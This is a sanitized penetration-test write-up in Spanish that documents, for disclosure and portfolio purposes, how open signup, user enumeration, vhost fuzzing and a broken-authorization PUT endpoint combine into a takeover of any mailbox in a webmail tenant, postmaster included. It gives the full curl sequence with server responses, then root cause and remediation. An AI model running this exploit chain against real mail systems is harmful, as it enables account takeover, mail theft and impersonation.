> Este chain está sanitizado para publicación: dominios, IPs, tokens, cookies, contraseñas y datos personales son placeholders. La estructura técnica, los endpoints, la lógica de la vulnerabilidad y las respuestas del servidor son fieles al engagement real. El hallazgo fue reportado de forma responsable al propietario del activo antes de escribir esta versión pública.

## 1. Alcance y contexto

Objetivo: un tenant de correo corporativo (`mail.domain.com`) operado sobre una plataforma de webmail de terceros, con un panel administrativo de proveedor (white-label) expuesto por detrás. Engagement black-box: sin credenciales, sin cuentas de prueba entregadas por el cliente, sin documentación interna — solo el dominio principal.

Activos relevantes descubiertos durante el propio chain (nombres sanitizados):

| Host | Rol | Por qué importa |
| --- | --- | --- |
| `domain.com` | Punto de entrada público | Expone un flujo de registro (`/mail/sign-up`) que crea cuentas dentro del tenant `mail.domain.com` |
| `webmail.domain.com` | Webmail del tenant | Frontend + API de autenticación, contactos, calendarios y mensajería |
| `203.0.113.10` | IP directa del backend de correo | Permitió fuzzing de virtual hosts vía el header `Host` |
| `panel.mailhost-example.com` | Panel administrativo del proveedor | SPA de gestión de cuentas de correo del tenant, descubierta por vhost fuzzing |

Objetivo del engagement: determinar si un atacante externo anónimo, partiendo solo del dominio público, podía alcanzar control administrativo sobre el tenant de correo.

## 2. Recon — de dominio público a superficie relevante

Enumeración estándar de subdominios y tecnologías para separar hosts genéricos de los realmente relevantes para el flujo de correo.

```bash
python3 recon.py domain.com
awk '{print $1}' alive.txt > alive_urls.txt
whatweb -i alive_urls.txt --log-brief whatweb.txt
nuclei -l alive_urls.txt -tags tech -o nuclei_tech.txt
```

De la lista completa de hosts, solo `domain.com`, `webmail.domain.com` y la IP directa del backend de correo resultaron relevantes para este chain; el resto quedó descartado de la ruta de ataque.

## 3. De registro público a identidad funcional dentro del tenant

El endpoint de signup (`https://domain.com/mail/sign-up`) permitía registrar una cuenta y añadirla directamente al tenant `mail.domain.com`, sin verificación de email ni ningún paso de aprobación.

```bash
# Capturar el token CSRF del formulario de registro
CSRF=$(curl -sc /tmp/cook.txt https://domain.com/mail/sign-up \
  | grep -oP '(?<=sign_up_email_from\[_token\]" value=")[^"]+')

# El formulario también permite enumerar usuarios existentes
curl -sb /tmp/cook.txt -X POST https://domain.com/mail/sign-up \
  -d "sign_up_email_from[name]=known_user&sign_up_email_from[_token]=${CSRF}" \
  | grep -i "already taken"
# "this name already taken" => el usuario ya existe

# Registrar una cuenta propia, de bajo privilegio
curl -sk -b /tmp/cook.txt -c /tmp/cook.txt -X POST https://domain.com/mail/sign-up \
  --data-urlencode "sign_up_email_from[firstname]=Test" \
  --data-urlencode "sign_up_email_from[name]=tester0001" \
  --data-urlencode "sign_up_email_from[password][first]=Str0ngTestPass!1" \
  --data-urlencode "sign_up_email_from[password][second]=Str0ngTestPass!1" \
  --data-urlencode "sign_up_email_from[_token]=${CSRF}"
```

La hipótesis: si el signup crea una cuenta funcional (no decorativa) dentro de `mail.domain.com`, esa cuenta puede usarse como foothold autenticado contra el resto del ecosistema. Se validó autenticando la nueva cuenta contra la API del webmail:

```bash
TOKEN=$(curl -s -X POST https://webmail.domain.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester0001@mail.domain.com","password":"Str0ngTestPass!1"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

echo "TOKEN: $TOKEN"
# TOKEN: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.REDACTED_JWT_PAYLOAD.REDACTED_SIGNATURE
```

La API devolvió un JWT válido. El registro público no era una cáscara vacía: producía una identidad real y operativa dentro del tenant, sin ningún control de aprobación. A partir de aquí el chain pasa de **acceso público no autenticado** a **acceso autenticado con una cuenta de bajo privilegio**.

## 4. Enumeración de usuarios reales del tenant

Con el JWT de la cuenta propia se consultó el endpoint de contactos compartidos, que devolvió cuentas reales del dominio:

```bash
curl -s "https://webmail.domain.com/api/contacts/searchshare?search=" \
  -H "x-access-token: $TOKEN" | python3 -m json.tool
```

```json
{
  "email": "user01@mail.domain.com",
  "name": "Jane Doe"
}
```

Consultas adicionales sobre ese usuario (calendario, contactos compartidos) confirmaron metadata expuesta a una cuenta sin privilegios:

| Campo | Valor observado (sanitizado) | Interpretación |
| --- | --- | --- |
| `company` | `Example Media Group LLC` | Organización asociada al tenant |
| `customer_id` | `000001` | Identificador interno del cliente |
| `email` | `user01@mail.domain.com` | Cuenta real del tenant |
| `calendar_owner` | `user01@mail.domain.com` | Calendario personal descubierto (no leído) |

Una cuenta creada por el propio atacante, sin ninguna relación previa con el tenant, podía enumerar identidades reales de la organización. Esto convierte cualquier registro público en una vía de reconocimiento interno.

Se probó también el endpoint de reseteo delegado de contraseña sobre el usuario identificado:

```bash
curl -s -X POST "https://webmail.domain.com/api/auth/reset_delegate_pwd" \
  -H "x-access-token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"user01@mail.domain.com"}'
# {"res": false, "err": "Error from backend panel API, resetting delegate password"}
```

El endpoint existe y el backend intenta procesarlo — no responde "Unauthorized" ni "Not implemented". El error reveló, sin querer, que el webmail delega esta operación a un backend administrativo separado.

## 5. Descubrimiento del panel administrativo del proveedor

Si el webmail depende de un backend administrativo para operaciones de cuenta, el siguiente paso es localizar dónde está expuesto.

```bash
# Fuzzing de virtual hosts sobre la IP directa del backend de correo
curl -sk https://203.0.113.10 -H "Host: panel.mailhost-example.com" -I

HTTP/2 200
server: nginx
content-type: text/html; charset=utf-8
set-cookie: _adminpanel_session=REDACTED_SESSION_COOKIE; path=/; HttpOnly
x-runtime: 0.011294
```

El virtual host responde con una aplicación real (no un catch-all). Al revisar el HTML se confirma que es el panel de administración del proveedor de correo, y se identifica el bundle de producción de la SPA:

```bash
curl -sk https://203.0.113.10/dist/bundle.production.REDACTED.js \
  -H "Host: panel.mailhost-example.com" -o panel_bundle.js

# Rutas de autenticación dentro del bundle
grep -oE '"/[^"]{1,50}"' panel_bundle.js | grep -iE 'login|session|auth' | sort -u
# "/login"
# "/users/login"
# "/users/session"

# Base URL de la API usada por el frontend
grep -oE 'baseURL[^,;]+' panel_bundle.js
# baseURL: "/api"
```

Rutas del panel bajo `/api`: `/users/login` es el candidato evidente.

## 6. BOLA — modificar credenciales de cualquier cuenta del tenant

La cuenta de prueba, sin ningún privilegio administrativo, inicia sesión en el panel del proveedor con las mismas credenciales creadas por el signup público:

```bash
curl -sk -X POST https://203.0.113.10/api/users/login \
  -H "Host: panel.mailhost-example.com" \
  -H "Content-Type: application/json" \
  -d '{"email_address":"tester0001@mail.domain.com","password":"Str0ngTestPass!1"}' \
  -D -

HTTP/2 200
set-cookie: session_token=REDACTED_SESSION_TOKEN
```

El panel acepta la sesión. Navegando el panel de forma normal, el propio frontend dispara una petición que la UI usa para poblar la vista de administración del dominio — capturada tal cual en el proxy:

```http
GET /api/domains/D000001/email_accounts?per=9999999&postmaster=true HTTP/2
Host: panel.mailhost-example.com
Cookie: session_token=REDACTED_SESSION_TOKEN
```

La respuesta (~340 KB) es el **listado completo de cuentas del dominio**, incluida la cuenta `postmaster`, servido a una sesión sin ningún rol administrativo. De ahí se extrae la asociación `postmaster → P000001` (el `account_code` interno).

Un `GET` directo al recurso individual confirma que también es legible sin autorización:

```bash
curl -sk "https://203.0.113.10/api/domains/D000001/email_accounts/P000001" \
  -H "Host: panel.mailhost-example.com" \
  -b /tmp/panel_session.txt | python3 -m json.tool
```

```json
{
  "type": "Postmaster",
  "email_address": "postmaster@mail.domain.com",
  "webmail_disabled": false,
  "imap_disabled": false,
  "sessions": []
}
```

El paso crítico: el mismo endpoint acepta un `PUT` de escritura, sin validar que la sesión que llama sea dueña del `account_code` del path.

```bash
curl -sk -X PUT "https://203.0.113.10/api/domains/D000001/email_accounts/P000001" \
  -H "Host: panel.mailhost-example.com" \
  -H "Content-Type: application/json" \
  -b /tmp/panel_session.txt \
  -d '{"password":"N3wPassword!2","password_confirmation":"N3wPassword!2"}' \
  -w "\n%{http_code}\n"

# 204 No Content
```

`204 No Content` confirma que la contraseña de `postmaster@mail.domain.com` fue reescrita **desde la sesión de una cuenta regular sin privilegios**, sin exigir la contraseña actual de la cuenta objetivo como control de confirmación.

## 7. Takeover efectivo del buzón administrativo

Con la nueva contraseña, la autenticación contra el webmail confirma el takeover completo:

```bash
TOKEN_ADMIN=$(curl -s -X POST https://webmail.domain.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"postmaster@mail.domain.com","password":"N3wPassword!2"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

curl -s "https://webmail.domain.com/api/settings" \
  -H "x-access-token: $TOKEN_ADMIN" | python3 -m json.tool
```

Sesión válida como `postmaster@mail.domain.com`, con acceso a:

- Buzón administrativo del dominio — receptor típico de reportes DMARC, bounces, alertas y correos de recuperación de servicios externos asociados al dominio.
- Calendarios y contactos de todo el tenant.
- Capacidad de enviar correo como `postmaster@mail.domain.com`, con alta credibilidad para phishing interno o suplantación institucional.

Una conexión WebSocket adicional (protocolo Socket.IO usado por el webmail para IMAP en tiempo real) confirmó que el token obtenido operaba correctamente en el contexto del usuario comprometido — listado de carpetas IMAP, apertura de INBOX y cuota de buzón, todo servido bajo la identidad tomada.

## 8. El patrón se repite contra cualquier cuenta del dominio

El mismo `PUT /api/domains/{domain_code}/email_accounts/{account_code}` no es exclusivo de `postmaster`: aplica a cualquier `account_code` del tenant. Se validó repitiendo el chain completo (signup → login en el panel → sobrescritura de password → login en webmail) contra una segunda cuenta de usuario real identificada en el paso 4, con idéntico resultado: `204 No Content` y acceso total al buzón.

Durante esa repetición, `/api/settings` expuso además secretos de integración de terceros configurados a nivel de tenant (client ID / client secret de una integración de videollamadas) y endpoints internos de sincronización de calendario (CalDAV) no documentados públicamente — hallazgo secundario de exposición de información, no el vector principal del takeover.

## 9. Causa raíz

El defecto no es un endpoint aislado mal protegido: es un patrón de autorización ausente en toda la familia `/api/domains/{domain_code}/email_accounts/*`.

1. **Falta de validación de ownership a nivel de recurso.** El handler que sirve el `PUT` no comprueba que la sesión que llama sea dueña del `account_code` del path, ni que tenga rol administrativo sobre el dominio.
2. **Falta de control de rol a nivel de función.** Operaciones administrativas (listado total de cuentas, modificación de cuentas ajenas) son alcanzables desde sesiones de cuentas regulares — no existe distinción de rol en el backend.
3. **Sin reautenticación en operación sensible.** El cambio de contraseña no exige la contraseña actual de la cuenta objetivo, eliminando la última red de seguridad incluso si el paso 1 no existiera.

Combinado con el signup público sin verificación (paso 3), el chain completo es ejecutable por un atacante externo anónimo, sin interacción de la víctima, en cuestión de segundos.

## 10. Impacto de negocio

- Compromiso total del buzón administrativo del dominio (`postmaster`), y por extensión de **cualquier cuenta** del tenant.
- Capacidad de enviar correo con la identidad institucional del dominio — vector directo de phishing interno o fraude (BEC).
- Exposición de metadata de todos los usuarios del tenant (nombres, empresa, calendarios) a cualquier cuenta recién registrada.
- Secretos de integraciones de terceros expuestos vía el mismo endpoint de settings.
- Severidad: **Crítica** — cadena reproducible end-to-end, sin credenciales previas, sin interacción de la víctima.

## 11. Remediación recomendada

- Validar ownership del recurso en cada operación de `email_accounts`: la sesión que llama debe coincidir con el `account_code` del path, o poseer un rol administrativo explícito sobre el dominio.
- Exigir la contraseña actual (o un segundo factor) antes de cualquier cambio de credenciales, incluso desde el propio panel administrativo.
- Aplicar control de acceso basado en rol (RBAC) a nivel de función para los endpoints de listado y modificación masiva de cuentas — no solo a nivel de UI.
- Añadir verificación de email obligatoria en el flujo de signup público antes de otorgar cualquier identidad funcional dentro del tenant.
- Revisar qué otros atributos acepta el mismo `PUT` (forwards, cuotas, autoresponder, estado) — el patrón de falta de autorización probablemente se extiende más allá del cambio de contraseña.

## 12. Nota de responsible disclosure

Este hallazgo fue reportado al propietario real del activo antes de esta publicación. La versión aquí mostrada es una reconstrucción sanitizada del engagement con fines de portfolio: dominios, IPs, credenciales, tokens y datos personales son placeholders; la lógica de la vulnerabilidad, los endpoints y las respuestas del servidor reflejan fielmente lo observado durante la prueba autorizada.
